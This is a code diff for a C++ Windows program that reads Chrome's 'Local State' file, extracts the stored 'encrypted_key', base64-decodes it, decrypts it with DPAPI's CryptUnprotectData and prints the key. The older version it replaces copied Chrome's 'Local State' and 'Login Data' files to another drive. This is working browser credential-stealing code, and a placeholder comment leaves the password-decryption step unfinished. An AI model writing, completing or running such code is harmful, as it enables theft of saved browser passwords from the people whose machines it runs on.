@@ -7,51 +7,67 @@
 #include <string>
 #include <Windows.h>
 #include <cstdlib>
+#include <vector>
 #include <dpapi.h>
 #include <wincrypt.h>
 #include "sqlite3.h"
 using namespace std;
 
+string DecryptData(const vector<unsigned char>& encryptedData) {
+    DATA_BLOB encryptedBlob;
+    encryptedBlob.cbData = static_cast<DWORD>(encryptedData.size());
+    encryptedBlob.pbData = const_cast<BYTE*>(encryptedData.data());
+
+    DATA_BLOB decryptedBlob;
+    if (!CryptUnprotectData(&encryptedBlob, nullptr, nullptr, nullptr, nullptr, 0, &decryptedBlob)) {
+        throw runtime_error("Failed to decrypt data");
+    }
+
+    string decryptedData(reinterpret_cast<const char*>(decryptedBlob.pbData), decryptedBlob.cbData);
+    LocalFree(decryptedBlob.pbData);
+    return decryptedData;
+}
+
 int main() {
-	char* userProfile = getenv("USERPROFILE"); //Gets environment varialble "%userprofile%"
-	string passwordsFilePath = userProfile;
-	string masterKeyPath = userProfile;
+    char* userProfile = getenv("USERPROFILE"); // Gets environment variable "%userprofile%"
+    string passwordsFilePath = userProfile;
+    string masterKeyPath = userProfile;
 
-	passwordsFilePath += "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"; //Appends file path to "USERPROFILE", same thing line 21
-	masterKeyPath += "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State";
+    passwordsFilePath += "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"; // Appends file path to "USERPROFILE"
+    masterKeyPath += "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State";
 
-	ifstream masterKeyFile(masterKeyPath, ios::binary);
-	string masterKeyFileContent;
+    ifstream masterKeyFile(masterKeyPath, ios::binary);
+    string masterKeyFileContent;
 
-	if (masterKeyFile.is_open()) {
+    if (masterKeyFile.is_open()) {
+        string encodedKey;
+        while (getline(masterKeyFile, masterKeyFileContent)) {
+            encodedKey += masterKeyFileContent;
+        }
+        masterKeyFile.close();
 
-		ofstream contentLanding("D:/clonedFile/clonedLocalState");
-		while (getline(masterKeyFile, masterKeyFileContent))
-		{
-			contentLanding << masterKeyFileContent;
-		}
-		masterKeyFile.close();
-	}
+        // Extract the encrypted key from the Local State file content
+        const size_t pos = encodedKey.find("\"encrypted_key\":\"") + 17;
+        encodedKey = encodedKey.substr(pos, encodedKey.find("\"", pos) - pos);
 
-	else {
-		cout << "Unable to fetch Local State file.";
-	}
+        // Decode the base64-encoded key
+        string decodedKey;
+        DWORD decodedSize = 0;
+        CryptStringToBinaryA(encodedKey.c_str(), static_cast<DWORD>(encodedKey.size()), CRYPT_STRING_BASE64, nullptr, &decodedSize, nullptr, nullptr);
+        decodedKey.resize(decodedSize);
+        CryptStringToBinaryA(encodedKey.c_str(), static_cast<DWORD>(encodedKey.size()), CRYPT_STRING_BASE64, reinterpret_cast<BYTE*>(&decodedKey[0]), &decodedSize, nullptr, nullptr);
 
-	ifstream loginFile(passwordsFilePath, ios::binary);
-	string passwordsFileContent;
+        // Decrypt the key using DPAPI
+        string decryptedKey = DecryptData(vector<unsigned char>(decodedKey.begin() + 5, decodedKey.end()));
 
-	if (loginFile.is_open()) {
+        // Use the decrypted key as needed
+        cout << "Decrypted Key: " << decryptedKey << endl;
+    }
+    else {
+        cout << "Unable to fetch Local State file." << endl;
+    }
 
-		ofstream contentLanding("D:/clonedFile/clonedLoginData");
-		while (getline(loginFile, passwordsFileContent))
-		{
-			contentLanding << passwordsFileContent;
-		}
-		loginFile.close();
-	}
+    // Rest of the code...
 
-	else {
-		cout << "Unable to fetch Login Data file.";
-	}
-
+    return 0;
 }
